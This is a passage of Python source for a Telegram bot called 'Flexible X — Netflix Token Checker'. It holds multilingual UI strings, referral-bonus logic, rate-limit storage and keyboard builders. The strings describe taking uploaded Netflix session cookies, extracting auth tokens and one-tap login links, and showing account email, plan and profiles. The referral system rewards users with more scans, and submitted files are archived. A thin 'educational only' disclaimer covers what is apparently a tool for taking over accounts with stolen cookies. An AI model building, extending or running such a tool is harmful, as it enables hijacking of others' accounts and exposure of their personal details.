        "disclaimer": "⚠️ <i>केवल शैक्षिक उपयोग। केवल अपनी कुकीज़ जांचें।</i>",
        "channel_label": "📢 आवश्यक चैनल:",
        "ask_title": "📤 <b>स्कैन के लिए तैयार</b>",
        "ask_desc": "अपनी कुकीज़ किसी भी प्रारूप में भेजें:",
        "ask_note": "<i>सभी प्रारूप स्वीकार किए जाते हैं और स्वचालित रूप से संसाधित होते हैं।</i>",
        "invalid_title": "❌ <b>अमान्य या समाप्त कुकी</b>",
        "invalid_desc": "हम वैध टोकन प्राप्त नहीं कर सके। इसका आमतौर पर अर्थ है:",
        "inv_reason1": "• कुकी अधूरी है या NetflixId गायब है",
        "inv_reason2": "• सत्र समाप्त हो गया या लॉग आउट हो गया",
        "inv_reason3": "• नेटफ्लिक्स ने अस्थायी रूप से अनुरोध ब्लॉक किया",
        "retry_title": "💡 <b>फिर कोशिश करें:</b>",
        "retry1": "1. ब्राउज़र से ताज़ा कुकीज़ एक्सपोर्ट करें",
        "retry2": "2. सुनिश्चित करें कि NetflixId शामिल है",
        "retry3": "3. कुछ मिनट प्रतीक्षा करें और पुनः प्रयास करें",
        "retry_hint": "<i>फिर से कोशिश करने के लिए नीचे 🔁 रीस्टार्ट टैप करें।</i>",
        "ref_title": "🎁 <b>रेफरल और पुरस्कार प्रणाली</b>",
        "ref_desc": "दोस्तों को आमंत्रित करें और प्रत्येक व्यक्ति के जुड़ने पर <b>+3 अतिरिक्त दैनिक स्कैन</b> कमाएं!",
        "ref_how_title": "📌 <b>यह कैसे काम करता है:</b>",
        "ref_step1": "1️⃣ नीचे अपना अनूठा आमंत्रण लिंक साझा करें",
        "ref_step2": "2️⃣ आपका दोस्त बोट शुरू करता है और चैनल से जुड़ता है",
        "ref_step3": "3️⃣ आपका दोस्त कम से कम 1 कुकी चेक भेजता है",
        "ref_step4": "4️⃣ आपको स्वचालित रूप से +3 दैनिक स्कैन मिलते हैं!",
        "ref_stats_title": "📊 <b>आपके आँकड़े:</b>",
        "ref_friends": "• 👥 आमंत्रित मित्र:",
        "ref_bonus": "• 🎯 अर्जित बोनस स्कैन:",
        "ref_limit": "• 📈 वर्तमान दैनिक सीमा:",
        "ref_link_label": "🔗 <b>आपका आमंत्रण लिंक:</b>",
        "ref_copy_hint": "<i>कॉपी करने के लिए ऊपर दिए लिंक को टैप करें!</i>",
        "btn_channel": "📢 चैनल",
        "btn_scan": "📥 नई फ़ाइल स्कैन करें",
        "btn_referral": "🎁 रेफरल",
        "btn_back": "🔙 मेनू पर वापस",
        "btn_change_lang": "🌐 भाषा बदलें",
        "btn_pc": "🖥️ PC लॉगिन",
        "btn_tv": "📺 TV लॉगिन",
        "btn_android": "🤖 एंड्रॉइड लॉगिन",
        "btn_iphone": "🍏 आईफोन लॉगिन",
        "btn_upload": "📥 फ़ाइल अपलोड",
        "btn_restart": "🔁 रीस्टार्ट",
        "btn_join": "चैनल से जुड़ें",
        "btn_joined": "मैं जुड़ गया ✅",
        "success_title": "✅ <b>खाता सक्रिय है</b>",
        "scan_time": "⏱ <b>स्कैन समय:</b>",
        "plan": "📄 <b>योजना:</b>",
        "email": "✉️ <b>ईमेल:</b>",
        "country": "🌍 <b>देश:</b>",
        "profiles": "👥 <b>प्रोफ़ाइल:</b>",
        "extra_members": "अतिरिक्त सदस्य:",
        "extra_yes": "अनुमति है",
        "extra_no": "अनुमति नहीं",
        "features": "⚙️ <b>सुविधाएँ:</b>",
        "login_hint": "🔽 <i>लॉगिन करने के लिए नीचे बटन उपयोग करें</i>",
        "acct_fail": "❗ <i>खाता पृष्ठ प्राप्त नहीं किया जा सका (कुकी समाप्त या ब्लॉक हो सकती है)।</i>",
        "balance_line": "📊 <b>शेष स्कैन:</b> {used}/{limit} ({remaining} शेष)",
        "daily_used": "आपके दैनिक स्कैन:",
        "select_lang_title": "🌐 <b>अपनी भाषा चुनें</b>",
        "select_lang_desc": "जारी रखने के लिए अपनी पसंदीदा भाषा चुनें:",
        "join_required": "इस बोट का उपयोग करने के लिए आपको हमारे चैनल की सदस्यता लेनी होगी: {channel}\n\nचैनल से जुड़ें और सत्यापित करने के लिए नीचे बटन दबाएं।",
        "joined_ok": "धन्यवाद — मैं देख रहा हूँ कि आप जुड़ गए। अब कुकी फ़ाइल भेजें या टेक्स्ट पेस्ट करें।",
        "not_joined": "मैं अभी भी आपको सदस्य के रूप में नहीं देख पा रहा। सुनिश्चित करें कि आप उसी खाते से जुड़े हैं और 'मैं जुड़ गया' दबाएं।",
        "press_scan_first": "⚠️ फ़ाइल भेजने से पहले कृपया पहले (📥 नई फ़ाइल स्कैन करें) बटन दबाएं।",
        "no_compressed": "❌ क्षमा करें, संपीड़ित फ़ाइलें स्वीकार नहीं की जातीं।",
        "file_too_large": "⚠️ फ़ाइल बहुत बड़ी है! अधिकतम अनुमत आकार 50 KB है।",
        "wrong_format": "⚠️ कृपया नेटफ्लिक्स कुकीज़ वाली .txt या .json फ़ाइल भेजें।",
        "init": "⏳ <b>प्रारंभ हो रहा है...</b>",
        "anim_validating": "कुकी प्रारूप सत्यापित किया जा रहा है...",
        "anim_connecting": "नेटफ्लिक्स सर्वर से कनेक्ट हो रहा है...",
        "anim_extracting": "प्रमाणीकरण टोकन निकाला जा रहा है...",
        "anim_fetching": "खाता विवरण प्राप्त किया जा रहा है...",
        "err_read_cookies": "❌ कुकीज़ पढ़ नहीं सकीं। प्रारूप जांचें और पुनः प्रयास करें।",
        "err_connection": "⚠️ कनेक्शन त्रुटि:",
        "err_unexpected": "⚠️ अप्रत्याशित त्रुटि:",
        "stuck_hint": "यदि आप अटक गए हैं, तो नीचे बटन पर क्लिक करें या /start भेजें।",
        "new_user_notify": "👤 <b>नया उपयोगकर्ता बोट से जुड़ा!</b>",
        "backup_data_caption": "📦 <b>डेटा बैकअप पूर्ण</b>",
        "backup_files_progress": "⏳ <b>आर्काइव फ़ाइलें संपीड़ित की जा रही हैं...</b>",
        "backup_files_caption": "📦 <b>आर्काइव बैकअप पूर्ण</b>\n\n• फ़ाइलें: <b>{count}</b>",
        "clear_success": "🗑️ <b>आर्काइव सफलतापूर्वक साफ किया गया</b>\n\n• हटाई गई फ़ाइलें: <b>{count}</b>",
        "limit_reached": "⛔ <b>दैनिक सीमा पहुँच गई।</b>\nआप 24 घंटे में {limit} फ़ाइलें संसाधित कर सकते हैं।\n<b>{time}</b> में पुनः प्रयास करें।",
        "slow_down": "⏳ <b>धीमे करें!</b>\nआपने लगातार {batch} फ़ाइलें भेजीं।\n<b>{time}</b> प्रतीक्षा करें।",
        "more_profiles": "+{count} और",
    },
    "tr": {
        "lang_name": "🇹🇷 Türkçe",
        "welcome_title": "🎬 <b>Flexible X — Netflix Token Denetleyici</b>",
        "welcome_desc": "👋 Hoş geldiniz! Netflix çerezlerinizden doğrudan giriş bağlantılarını ve hesap detaylarını çıkarıyorum.",
        "formats_title": "📋 <b>Desteklenen Formatlar:</b>",
        "fmt_netscape": "• 📄 <b>Netscape Dosyaları</b> (.txt)",
        "fmt_json": "• 📦 <b>JSON Dosyaları</b> (.json)",
        "fmt_raw": "• 📝 <b>Ham Başlık Dizeleri</b> (doğrudan yapıştırın)",
        "how_to_title": "🚀 <b>Nasıl başlanır:</b>",
        "step1": "1️⃣ Aşağıdan <b>📥 Yeni Dosya Tara</b>'ya dokunun",
        "step2": "2️⃣ Desteklenen herhangi bir dosyayı yükleyin veya çerezleri yapıştırın",
        "step3": "3️⃣ Sonuçlarınızı anında alın!",
        "disclaimer": "⚠️ <i>Yalnızca eğitim amaçlı kullanım. Yalnızca kendi çerezlerinizi kontrol edin.</i>",
        "channel_label": "📢 Gerekli kanal:",
        "ask_title": "📤 <b>Taramaya Hazır</b>",
        "ask_desc": "Çerezlerinizi HERHANGİ BİR formatta gönderin:",
        "ask_note": "<i>Tüm formatlar kabul edilir ve otomatik olarak işlenir.</i>",
        "invalid_title": "❌ <b>Geçersiz veya Süresi Dolmuş Çerez</b>",
        "invalid_desc": "Geçerli bir token alamadık. Bu genellikle şu anlama gelir:",
        "inv_reason1": "• Çerez eksik veya NetflixId yok",
        "inv_reason2": "• Oturum süresi doldu veya çıkış yapıldı",
        "inv_reason3": "• Netflix isteği geçici olarak engelledi",
        "retry_title": "💡 <b>Tekrar deneyin:</b>",
        "retry1": "1. Tarayıcınızdan yeni çerezleri dışa aktarın",
        "retry2": "2. NetflixId'nin dahil olduğundan emin olun",
        "retry3": "3. Birkaç dakika bekleyin ve tekrar deneyin",
        "retry_hint": "<i>Tekrar denemek için aşağıdan 🔁 Yeniden Başlat'a dokunun.</i>",
        "ref_title": "🎁 <b>Yönlendirme ve Ödül Sistemi</b>",
        "ref_desc": "Arkadaşlarınızı davet edin ve katılan her kişi için <b>+3 ekstra günlük tarama</b> kazanın!",
        "ref_how_title": "📌 <b>Nasıl çalışır:</b>",
        "ref_step1": "1️⃣ Benzersiz davet bağlantınızı aşağıda paylaşın",
        "ref_step2": "2️⃣ Arkadaşınız botu başlatır ve kanala katılır",
        "ref_step3": "3️⃣ Arkadaşınız en az 1 çerez kontrolü gönderir",
        "ref_step4": "4️⃣ Otomatik olarak +3 günlük tarama kazanırsınız!",
        "ref_stats_title": "📊 <b>İstatistikleriniz:</b>",
        "ref_friends": "• 👥 Davet edilen arkadaşlar:",
        "ref_bonus": "• 🎯 Kazanılan bonus taramalar:",
        "ref_limit": "• 📈 Mevcut günlük limit:",
        "ref_link_label": "🔗 <b>Davet bağlantınız:</b>",
        "ref_copy_hint": "<i>Kopyalamak için yukarıdaki bağlantıya dokunun!</i>",
        "btn_channel": "📢 Kanal",
        "btn_scan": "📥 Yeni Dosya Tara",
        "btn_referral": "🎁 Yönlendirme",
        "btn_back": "🔙 Menüye Dön",
        "btn_change_lang": "🌐 Dil Değiştir",
        "btn_pc": "🖥️ PC Girişi",
        "btn_tv": "📺 TV Girişi",
        "btn_android": "🤖 Android Girişi",
        "btn_iphone": "🍏 iPhone Girişi",
        "btn_upload": "📥 Dosya Yükle",
        "btn_restart": "🔁 Yeniden Başlat",
        "btn_join": "Kanala Katıl",
        "btn_joined": "Katıldım ✅",
        "success_title": "✅ <b>Hesap Aktif</b>",
        "scan_time": "⏱ <b>Tarama Zamanı:</b>",
        "plan": "📄 <b>Plan:</b>",
        "email": "✉️ <b>E-posta:</b>",
        "country": "🌍 <b>Ülke:</b>",
        "profiles": "👥 <b>Profiller:</b>",
        "extra_members": "Ekstra üyeler:",
        "extra_yes": "İzin veriliyor",
        "extra_no": "İzin verilmiyor",
        "features": "⚙️ <b>Özellikler:</b>",
        "login_hint": "🔽 <i>Giriş yapmak için aşağıdaki düğmeleri kullanın</i>",
        "acct_fail": "❗ <i>Hesap sayfası alınamadı (çerez süresi dolmuş veya engellenmiş olabilir).</i>",
        "balance_line": "📊 <b>Kalan taramalar:</b> {used}/{limit} ({remaining} kaldı)",
        "daily_used": "Günlük taramalarınız:",
        "select_lang_title": "🌐 <b>Dilinizi Seçin</b>",
        "select_lang_desc": "Devam etmek için tercih ettiğiniz dili seçin:",
        "join_required": "Bu botu kullanmak için kanalımıza abone olmalısınız: {channel}\n\nKanala katılın ve doğrulamak için aşağıdaki düğmeye basın.",
        "joined_ok": "Teşekkürler — katıldığınızı görüyorum. Şimdi çerez dosyasını gönderin veya metni yapıştırın.",
        "not_joined": "Sizi hâlâ üye olarak göremiyorum. Aynı hesapla katıldığınızdan emin olun ve 'Katıldım'a basın.",
        "press_scan_first": "⚠️ Dosya göndermeden önce lütfen önce (📥 Yeni Dosya Tara) düğmesine basın.",
        "no_compressed": "❌ Üzgünüz, sıkıştırılmış dosyalar kabul edilmez.",
        "file_too_large": "⚠️ Dosya çok büyük! İzin verilen maksimum boyut 50 KB'dir.",
        "wrong_format": "⚠️ Lütfen Netflix çerezlerinizi içeren bir .txt veya .json dosyası gönderin.",
        "init": "⏳ <b>Başlatılıyor...</b>",
        "anim_validating": "Çerez formatı doğrulanıyor...",
        "anim_connecting": "Netflix sunucularına bağlanılıyor...",
        "anim_extracting": "Kimlik doğrulama token'ı çıkarılıyor...",
        "anim_fetching": "Hesap detayları alınıyor...",
        "err_read_cookies": "❌ Çerezler okunamadı. Formatı kontrol edin ve tekrar deneyin.",
        "err_connection": "⚠️ Bağlantı hatası:",
        "err_unexpected": "⚠️ Beklenmeyen hata:",
        "stuck_hint": "Takılı kaldıysanız, aşağıdaki düğmeye tıklayın veya /start gönderin.",
        "new_user_notify": "👤 <b>Yeni kullanıcı bota katıldı!</b>",
        "backup_data_caption": "📦 <b>Veri Yedekleme Tamamlandı</b>",
        "backup_files_progress": "⏳ <b>Arşiv dosyaları sıkıştırılıyor...</b>",
        "backup_files_caption": "📦 <b>Arşiv Yedekleme Tamamlandı</b>\n\n• Dosyalar: <b>{count}</b>",
        "clear_success": "🗑️ <b>Arşiv Başarıyla Temizlendi</b>\n\n• Silinen dosyalar: <b>{count}</b>",
        "limit_reached": "⛔ <b>Günlük limite ulaşıldı.</b>\n24 saatte en fazla {limit} dosya işleyebilirsiniz.\n<b>{time}</b> sonra tekrar deneyin.",
        "slow_down": "⏳ <b>Yavaşlayın!</b>\nArka arkaya {batch} dosya gönderdiniz.\n<b>{time}</b> bekleyin.",
        "more_profiles": "+{count} daha",
    },
    "ru": {
        "lang_name": "🇷🇺 Русский",
        "welcome_title": "🎬 <b>Flexible X — Проверка токенов Netflix</b>",
        "welcome_desc": "👋 Добро пожаловать! Я извлекаю прямые ссылки для входа и данные аккаунта из ваших куки Netflix.",
        "formats_title": "📋 <b>Поддерживаемые форматы:</b>",
        "fmt_netscape": "• 📄 <b>Файлы Netscape</b> (.txt)",
        "fmt_json": "• 📦 <b>Файлы JSON</b> (.json)",
        "fmt_raw": "• 📝 <b>Строки заголовков</b> (вставить напрямую)",
        "how_to_title": "🚀 <b>Как начать:</b>",
        "step1": "1️⃣ Нажмите <b>📥 Сканировать файл</b> ниже",
        "step2": "2️⃣ Загрузите любой поддерживаемый файл или вставьте куки",
        "step3": "3️⃣ Получите результаты мгновенно!",
        "disclaimer": "⚠️ <i>Только для образовательных целей. Проверяйте только свои куки.</i>",
        "channel_label": "📢 Требуемый канал:",
        "ask_title": "📤 <b>Готов к сканированию</b>",
        "ask_desc": "Отправьте куки в ЛЮБОМ формате:",
        "ask_note": "<i>Все форматы принимаются и обрабатываются автоматически.</i>",
        "invalid_title": "❌ <b>Недействительный или истёкший куки</b>",
        "invalid_desc": "Не удалось получить действительный токен. Обычно это означает:",
        "inv_reason1": "• Куки неполный или отсутствует NetflixId",
        "inv_reason2": "• Сессия истекла или выполнен выход",
        "inv_reason3": "• Netflix временно заблокировал запрос",
        "retry_title": "💡 <b>Попробуйте снова:</b>",
        "retry1": "1. Экспортируйте свежие куки из браузера",
        "retry2": "2. Убедитесь, что NetflixId включён",
        "retry3": "3. Подождите несколько минут и повторите",
        "retry_hint": "<i>Нажмите 🔁 Перезапустить ниже для повторной попытки.</i>",
        "ref_title": "🎁 <b>Система рефералов и наград</b>",
        "ref_desc": "Приглашайте друзей и получайте <b>+3 дополнительных сканирования ежедневно</b> за каждого присоединившегося!",
        "ref_how_title": "📌 <b>Как это работает:</b>",
        "ref_step1": "1️⃣ Поделитесь уникальной ссылкой ниже",
        "ref_step2": "2️⃣ Ваш друг запускает бота и присоединяется к каналу",
        "ref_step3": "3️⃣ Ваш друг отправляет хотя бы 1 проверку куки",
        "ref_step4": "4️⃣ Вы получаете +3 ежедневных сканирования автоматически!",
        "ref_stats_title": "📊 <b>Ваша статистика:</b>",
        "ref_friends": "• 👥 Приглашённых друзей:",
        "ref_bonus": "• 🎯 Заработано бонусных сканирований:",
        "ref_limit": "• 📈 Текущий дневной лимит:",
        "ref_link_label": "🔗 <b>Ваша ссылка приглашения:</b>",
        "ref_copy_hint": "<i>Нажмите на ссылку выше, чтобы скопировать!</i>",
        "btn_channel": "📢 Канал",
        "btn_scan": "📥 Сканировать файл",
        "btn_referral": "🎁 Рефералы",
        "btn_back": "🔙 Назад в меню",
        "btn_change_lang": "🌐 Сменить язык",
        "btn_pc": "🖥️ Вход PC",
        "btn_tv": "📺 Вход TV",
        "btn_android": "🤖 Вход Android",
        "btn_iphone": "🍏 Вход iPhone",
        "btn_upload": "📥 Загрузить файл",
        "btn_restart": "🔁 Перезапустить",
        "btn_join": "Присоединиться к каналу",
        "btn_joined": "Я присоединился ✅",
        "success_title": "✅ <b>Аккаунт активен</b>",
        "scan_time": "⏱ <b>Время сканирования:</b>",
        "plan": "📄 <b>План:</b>",
        "email": "✉️ <b>Email:</b>",
        "country": "🌍 <b>Страна:</b>",
        "profiles": "👥 <b>Профили:</b>",
        "extra_members": "Доп. участники:",
        "extra_yes": "Разрешено",
        "extra_no": "Запрещено",
        "features": "⚙️ <b>Функции:</b>",
        "login_hint": "🔽 <i>Используйте кнопки ниже для входа</i>",
        "acct_fail": "❗ <i>Не удалось получить страницу аккаунта (куки может быть истёкшим или заблокированным).</i>",
        "balance_line": "📊 <b>Осталось сканирований:</b> {used}/{limit} ({remaining} осталось)",
        "daily_used": "Ваши ежедневные сканирования:",
        "select_lang_title": "🌐 <b>Выберите язык</b>",
        "select_lang_desc": "Выберите предпочитаемый язык для продолжения:",
        "join_required": "Для использования бота подпишитесь на наш канал: {channel}\n\nПрисоединитесь к каналу и нажмите кнопку ниже для проверки.",
        "joined_ok": "Спасибо — я вижу, что вы присоединились. Теперь отправьте файл куки или вставьте текст.",
        "not_joined": "Я всё ещё не вижу вас как участника. Убедитесь, что присоединились с тем же аккаунтом, и нажмите 'Я присоединился'.",
        "press_scan_first": "⚠️ Сначала нажмите кнопку (📥 Сканировать файл) перед отправкой файла.",
        "no_compressed": "❌ Извините, сжатые файлы не принимаются.",
        "file_too_large": "⚠️ Файл слишком большой! Максимальный размер — 50 КБ.",
        "wrong_format": "⚠️ Отправьте файл .txt или .json с куки Netflix.",
        "init": "⏳ <b>Инициализация...</b>",
        "anim_validating": "Проверка формата куки...",
        "anim_connecting": "Подключение к серверам Netflix...",
        "anim_extracting": "Извлечение токена аутентификации...",
        "anim_fetching": "Получение данных аккаунта...",
        "err_read_cookies": "❌ Не удалось прочитать куки. Проверьте формат и попробуйте снова.",
        "err_connection": "⚠️ Ошибка подключения:",
        "err_unexpected": "⚠️ Неожиданная ошибка:",
        "stuck_hint": "Если вы застряли, нажмите кнопку ниже или отправьте /start.",
        "new_user_notify": "👤 <b>Новый пользователь присоединился к боту!</b>",
        "backup_data_caption": "📦 <b>Резервное копирование данных завершено</b>",
        "backup_files_progress": "⏳ <b>Сжатие файлов архива...</b>",
        "backup_files_caption": "📦 <b>Резервное копирование архива завершено</b>\n\n• Файлов: <b>{count}</b>",
        "clear_success": "🗑️ <b>Архив успешно очищен</b>\n\n• Удалено файлов: <b>{count}</b>",
        "limit_reached": "⛔ <b>Дневной лимит достигнут.</b>\nВы можете обработать до {limit} файлов за 24 часа.\nПопробуйте через <b>{time}</b>.",
        "slow_down": "⏳ <b>Притормозите!</b>\nВы отправили {batch} файлов подряд.\nПодождите <b>{time}</b>.",
        "more_profiles": "+{count} ещё",
    },
    "de": {
        "lang_name": "🇩🇪 Deutsch",
        "welcome_title": "🎬 <b>Flexible X — Netflix Token Prüfer</b>",
        "welcome_desc": "👋 Willkommen! Ich extrahiere direkte Login-Links und Kontodetails aus Ihren Netflix-Cookies.",
        "formats_title": "📋 <b>Unterstützte Formate:</b>",
        "fmt_netscape": "• 📄 <b>Netscape-Dateien</b> (.txt)",
        "fmt_json": "• 📦 <b>JSON-Dateien</b> (.json)",
        "fmt_raw": "• 📝 <b>Rohe Header-Strings</b> (direkt einfügen)",
        "how_to_title": "🚀 <b>So starten Sie:</b>",
        "step1": "1️⃣ Tippen Sie unten auf <b>📥 Neue Datei scannen</b>",
        "step2": "2️⃣ Laden Sie eine unterstützte Datei hoch oder fügen Sie Cookies ein",
        "step3": "3️⃣ Erhalten Sie Ihre Ergebnisse sofort!",
        "disclaimer": "⚠️ <i>Nur für Bildungszwecke. Prüfen Sie nur eigene Cookies.</i>",
        "channel_label": "📢 Erforderlicher Kanal:",
        "ask_title": "📤 <b>Bereit zum Scannen</b>",
        "ask_desc": "Senden Sie Ihre Cookies in JEDEM Format:",
        "ask_note": "<i>Alle Formate werden akzeptiert und automatisch verarbeitet.</i>",
        "invalid_title": "❌ <b>Ungültiger oder abgelaufener Cookie</b>",
        "invalid_desc": "Wir konnten keinen gültigen Token abrufen. Dies bedeutet normalerweise:",
        "inv_reason1": "• Cookie ist unvollständig oder NetflixId fehlt",
        "inv_reason2": "• Sitzung ist abgelaufen oder ausgeloggt",
        "inv_reason3": "• Netflix hat die Anfrage vorübergehend blockiert",
        "retry_title": "💡 <b>Versuchen Sie es erneut:</b>",
        "retry1": "1. Exportieren Sie frische Cookies aus Ihrem Browser",
        "retry2": "2. Stellen Sie sicher, dass NetflixId enthalten ist",
        "retry3": "3. Warten Sie einige Minuten und versuchen Sie es erneut",
        "retry_hint": "<i>Tippen Sie unten auf 🔁 Neustart, um es erneut zu versuchen.</i>",
        "ref_title": "🎁 <b>Empfehlungs- und Belohnungssystem</b>",
        "ref_desc": "Laden Sie Freunde ein und erhalten Sie <b>+3 zusätzliche tägliche Scans</b> pro Person, die beitritt!",
        "ref_how_title": "📌 <b>So funktioniert es:</b>",
        "ref_step1": "1️⃣ Teilen Sie Ihren einzigartigen Einladungslink unten",
        "ref_step2": "2️⃣ Ihr Freund startet den Bot und tritt dem Kanal bei",
        "ref_step3": "3️⃣ Ihr Freund sendet mindestens 1 Cookie-Check",
        "ref_step4": "4️⃣ Sie erhalten automatisch +3 tägliche Scans!",
        "ref_stats_title": "📊 <b>Ihre Statistiken:</b>",
        "ref_friends": "• 👥 Eingeladene Freunde:",
        "ref_bonus": "• 🎯 Verdiente Bonus-Scans:",
        "ref_limit": "• 📈 Aktuelles Tageslimit:",
        "ref_link_label": "🔗 <b>Ihr Einladungslink:</b>",
        "ref_copy_hint": "<i>Tippen Sie auf den Link oben, um ihn zu kopieren!</i>",
        "btn_channel": "📢 Kanal",
        "btn_scan": "📥 Neue Datei scannen",
        "btn_referral": "🎁 Empfehlungen",
        "btn_back": "🔙 Zurück zum Menü",
        "btn_change_lang": "🌐 Sprache ändern",
        "btn_pc": "🖥️ PC Login",
        "btn_tv": "📺 TV Login",
        "btn_android": "🤖 Android Login",
        "btn_iphone": "🍏 iPhone Login",
        "btn_upload": "📥 Datei hochladen",
        "btn_restart": "🔁 Neustart",
        "btn_join": "Kanal beitreten",
        "btn_joined": "Ich bin beigetreten ✅",
        "success_title": "✅ <b>Konto ist aktiv</b>",
        "scan_time": "⏱ <b>Scan-Zeit:</b>",
        "plan": "📄 <b>Plan:</b>",
        "email": "✉️ <b>Email:</b>",
        "country": "🌍 <b>Land:</b>",
        "profiles": "👥 <b>Profile:</b>",
        "extra_members": "Zusätzliche Mitglieder:",
        "extra_yes": "Erlaubt",
        "extra_no": "Nicht erlaubt",
        "features": "⚙️ <b>Funktionen:</b>",
        "login_hint": "🔽 <i>Verwenden Sie die Buttons unten zum Einloggen</i>",
        "acct_fail": "❗ <i>Kontoseite konnte nicht abgerufen werden (Cookie könnte abgelaufen oder blockiert sein).</i>",
        "balance_line": "📊 <b>Verbleibende Scans:</b> {used}/{limit} ({remaining} übrig)",
        "daily_used": "Ihre täglichen Scans:",
        "select_lang_title": "🌐 <b>Wählen Sie Ihre Sprache</b>",
        "select_lang_desc": "Wählen Sie Ihre bevorzugte Sprache, um fortzufahren:",
        "join_required": "Um diesen Bot zu nutzen, müssen Sie unseren Kanal abonnieren: {channel}\n\nTreten Sie dem Kanal bei und drücken Sie den Button unten zur Überprüfung.",
        "joined_ok": "Danke — ich sehe, dass Sie beigetreten sind. Senden Sie nun die Cookie-Datei oder fügen Sie den Text ein.",
        "not_joined": "Ich kann Sie immer noch nicht als Mitglied sehen. Stellen Sie sicher, dass Sie mit demselben Konto beigetreten sind, und drücken Sie 'Ich bin beigetreten'.",
        "press_scan_first": "⚠️ Bitte drücken Sie zuerst den Button (📥 Neue Datei scannen), bevor Sie die Datei senden.",
        "no_compressed": "❌ Entschuldigung, komprimierte Dateien werden nicht akzeptiert.",
        "file_too_large": "⚠️ Die Datei ist zu groß! Die maximale Größe beträgt 50 KB.",
        "wrong_format": "⚠️ Bitte senden Sie eine .txt oder .json Datei mit Ihren Netflix-Cookies.",
        "init": "⏳ <b>Initialisierung...</b>",
        "anim_validating": "Cookie-Format wird validiert...",
        "anim_connecting": "Verbindung zu Netflix-Servern...",
        "anim_extracting": "Authentifizierungs-Token wird extrahiert...",
        "anim_fetching": "Kontodetails werden abgerufen...",
        "err_read_cookies": "❌ Cookies konnten nicht gelesen werden. Überprüfen Sie das Format und versuchen Sie es erneut.",
        "err_connection": "⚠️ Verbindungsfehler:",
        "err_unexpected": "⚠️ Unerwarteter Fehler:",
        "stuck_hint": "Wenn Sie feststecken, klicken Sie auf den Button unten oder senden Sie /start.",
        "new_user_notify": "👤 <b>Neuer Benutzer ist dem Bot beigetreten!</b>",
        "backup_data_caption": "📦 <b>Datensicherung abgeschlossen</b>",
        "backup_files_progress": "⏳ <b>Archivdateien werden komprimiert...</b>",
        "backup_files_caption": "📦 <b>Archiv-Sicherung abgeschlossen</b>\n\n• Dateien: <b>{count}</b>",
        "clear_success": "🗑️ <b>Archiv erfolgreich geleert</b>\n\n• Gelöschte Dateien: <b>{count}</b>",
        "limit_reached": "⛔ <b>Tageslimit erreicht.</b>\nSie können bis zu {limit} Dateien pro 24 Stunden verarbeiten.\nVersuchen Sie es in <b>{time}</b> erneut.",
        "slow_down": "⏳ <b>Langsamer!</b>\nSie haben {batch} Dateien hintereinander gesendet.\nWarten Sie <b>{time}</b>.",
        "more_profiles": "+{count} weitere",
    },
}

SUPPORTED_LANGS = ["en", "ar", "fr", "es", "hi", "tr", "ru", "de"]


def t(lang: str, key: str, **kwargs) -> str:
    """Get translated string with optional formatting."""
    lang_dict = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    text = lang_dict.get(key, TRANSLATIONS["en"].get(key, key))
    if kwargs:
        try:
            text = text.format(**kwargs)
        except (KeyError, IndexError):
            pass
    return text


# ==================== PERSISTENT STORAGE HELPERS ====================

def _ensure_file_exists(filepath: Path, default_content: str = "") -> None:
    if not filepath.exists():
        try:
            filepath.parent.mkdir(parents=True, exist_ok=True)
            filepath.write_text(default_content)
        except Exception:
            pass


def _init_persistent_storage() -> None:
    VOLUME_ROOT.mkdir(parents=True, exist_ok=True)
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    _ensure_file_exists(REFERRALS_FILE, "{}")
    _ensure_file_exists(USERS_FILE, "")


# ==================== USER LANGUAGE PERSISTENCE ====================

def _load_user_lang(user_id: int) -> str:
    """Load user's saved language from rate_limits.json. Returns DEFAULT_LANG if not set."""
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        data = json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        return DEFAULT_LANG
    uid = str(user_id)
    return data.get(uid, {}).get("lang", "")


def _save_user_lang(user_id: int, lang: str) -> None:
    """Save user's language preference immediately to disk."""
    _ensure_file_exists(RATE_LIMITS_FILE, "{}")
    try:
        data = json.loads(RATE_LIMITS_FILE.read_text())
    except Exception:
        data = {}
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"batch_count": 0, "batch_reset_at": 0, "daily_count": 0, "daily_reset_at": 0}
    data[uid]["lang"] = lang
    RATE_LIMITS_FILE.write_text(json.dumps(data))


def _get_user_lang_or_none(user_id: int) -> str:
    """Return saved lang or empty string if never selected."""
    return _load_user_lang(user_id)


# ==================== REFERRAL SYSTEM ====================

def _load_referrals() -> dict:
    _ensure_file_exists(REFERRALS_FILE, "{}")
    try:
        return json.loads(REFERRALS_FILE.read_text())
    except Exception:
        return {}


def _save_referrals(data: dict) -> None:
    REFERRALS_FILE.write_text(json.dumps(data))


def _get_user_bonus(user_id: int) -> int:
    data = _load_referrals()
    uid = str(user_id)
    if uid not in data:
        return 0
    referred_count = len(data[uid].get("referred_users", []))
    bonus = referred_count * REFERRAL_BONUS_PER_USER
    max_bonus = REFERRAL_MAX_DAILY_LIMIT - BASE_DAILY_LIMIT
    return min(bonus, max_bonus)


def _record_referral(referrer_id: int, referred_id: int) -> bool:
    data = _load_referrals()
    ref_uid = str(referrer_id)
    refd_uid = str(referred_id)
    if ref_uid == refd_uid:
        return False
    if ref_uid not in data:
        data[ref_uid] = {"referred_users": []}
    if refd_uid in data[ref_uid]["referred_users"]:
        return False
    data[ref_uid]["referred_users"].append(refd_uid)
    _save_referrals(data)
    return True


def _get_effective_daily_limit(user_id: int) -> int:
    bonus = _get_user_bonus(user_id)
    return min(BASE_DAILY_LIMIT + bonus, REFERRAL_MAX_DAILY_LIMIT)


# ==================== KEYBOARD BUILDERS ====================

def _build_lang_selection_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for code in SUPPORTED_LANGS:
        label = TRANSLATIONS[code]["lang_name"]
        buttons.append([InlineKeyboardButton(label, callback_data=f"setlang_{code}")])
    return InlineKeyboardMarkup(buttons)


def _get_welcome_keyboard(lang: str) -> InlineKeyboardMarkup:
    channel_url = f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}" if CHANNEL_USERNAME else "https://t.me/"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t(lang, "btn_channel"), url=channel_url)],
        [InlineKeyboardButton(t(lang, "btn_scan"), callback_data="scan_file")],
        [InlineKeyboardButton(t(lang, "btn_referral"), callback_data="show_referral")],
        [InlineKeyboardButton(t(lang, "btn_change_lang"), callback_data="change_lang")],
    ])


def _get_common_keyboard(lang: str) -> InlineKeyboardMarkup:
